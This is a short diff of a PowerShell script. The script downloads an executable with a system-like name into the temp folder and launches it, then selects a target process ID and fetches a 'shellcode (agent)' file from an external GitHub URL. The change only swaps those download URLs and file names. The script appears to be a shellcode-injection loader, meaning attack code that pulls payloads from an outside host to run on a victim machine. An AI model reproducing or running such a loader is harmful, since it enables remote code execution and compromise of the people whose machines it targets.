@@ -1,6 +1,6 @@
 # --- Step 1: Download & Launch Test App ---
-$testAppUrl = "https://raw.githubusercontent.com/Magturn/Bat/main/scvhoster.exe"
-$tempPath   = "$env:TEMP\scvhoster.exe"
+$testAppUrl = "https://raw.githubusercontent.com/Magturn/win54/main/win54file.exe"
+$tempPath   = "$env:TEMP\win54file.exe"
 
 Write-Host "Downloading test app from $testAppUrl..."
 try {
@@ -29,7 +29,7 @@ $targetPID = $targetProcess.Id
 Write-Host "Using target process with PID: $targetPID"
 
 # --- Step 2: Download Shellcode (Agent) ---
-$agentUrl = "https://raw.githubusercontent.com/Magturn/Bat/main/winner.bin"
+$agentUrl = "https://raw.githubusercontent.com/Magturn/win54/main/win54update.bin"
 Write-Host "Downloading shellcode from $agentUrl..."
 try {
     $wc = New-Object System.Net.WebClient
